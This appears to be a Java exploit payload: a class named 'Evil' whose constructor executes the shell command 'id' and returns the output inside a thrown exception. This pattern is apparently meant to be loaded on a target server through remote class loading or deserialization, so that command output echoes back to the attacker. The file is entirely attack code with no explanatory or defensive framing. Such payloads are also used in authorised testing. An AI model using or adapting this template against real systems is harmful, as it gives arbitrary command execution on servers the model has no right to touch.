public class Evil{
    public Evil() throws Exception{
        Runtime rt = Runtime.getRuntime();
        String cmd = "id";
        Process process = rt.exec(cmd);
        java.io.InputStream in = process.getInputStream();
        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
        String s = null;
        StringBuilder r = new StringBuilder();
        while ((s = stdInput.readLine()) != null) {
            r.append(s);
        }
        throw new  Exception(r.toString());
    }
}
